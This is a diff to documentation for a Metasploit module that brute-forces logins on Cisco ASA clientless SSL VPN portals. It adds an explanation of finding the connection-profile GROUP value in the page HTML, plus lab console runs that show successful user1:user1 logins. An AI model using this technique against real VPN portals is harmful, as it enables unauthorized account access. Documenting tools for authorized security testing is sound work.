@@ -113,6 +113,21 @@ You should now be able to log in to the SSL VPN web portal using `user1`:`user1`
 
 ## Options
 
+### GROUP
+
+The connection profile to use. By default this is blank, but administrators can configure various different
+profiles that users can select from the drop down menu at the top of the login page. The alias in the drop
+down is *not* the value of `GROUP`. You need to extract it from the HTML.
+
+For example, my administrator has a profile named `TunnelGroup1` using the alias `alias1`. The drop down menu
+will show `alias1` but `TunnelGroup1` is the required value. In the page's HTML you'll find:
+
+```
+<option value="TunnelGroup1" selected>alias1</option>
+```
+
+To use `TunnelGroup1` you'd `set GROUP TunnelGroup1`.
+
 ### USERPASS_FILE
 
 File containing users and passwords separated by space, one pair per line.
@@ -140,7 +155,33 @@ msf6 auxiliary(scanner/http/cisco_asa_clientless_vpn) > set RHOST 10.9.49.201
 RHOST => 10.9.49.201
 msf6 auxiliary(scanner/http/cisco_asa_clientless_vpn) > run
 
-[*] The remote target appears to host Cisco SSL VPN Service. The moodule will continue.
+[*] The remote target appears to host Cisco SSL VPN Service. The module will continue.
+[*] Starting login brute force...
+[+] SUCCESSFUL LOGIN - "user1":"user1"
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/cisco_asa_clientless_vpn) > 
+```
+
+## ASAv 9.18.1 with Clientless SSL VPN enabled and the `user1:user1` on the `TunnelGroup1` Connection Profile
+
+```
+msf6 auxiliary(scanner/http/cisco_asa_clientless_vpn) > use auxiliary/scanner/http/cisco_asa_clientless_vpn
+msf6 auxiliary(scanner/http/cisco_asa_clientless_vpn) > set VERBOSE false
+VERBOSE => false
+msf6 auxiliary(scanner/http/cisco_asa_clientless_vpn) > set RHOST 10.9.49.201
+RHOST => 10.9.49.201
+msf6 auxiliary(scanner/http/cisco_asa_clientless_vpn) > run
+
+[*] The remote target appears to host Cisco SSL VPN Service. The module will continue.
+[*] Starting login brute force...
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/http/cisco_asa_clientless_vpn) > set GROUP TunnelGroup1
+GROUP => TunnelGroup1
+msf6 auxiliary(scanner/http/cisco_asa_clientless_vpn) > run
+
+[*] The remote target appears to host Cisco SSL VPN Service. The module will continue.
 [*] Starting login brute force...
 [+] SUCCESSFUL LOGIN - "user1":"user1"
 [*] Scanned 1 of 1 hosts (100% complete)
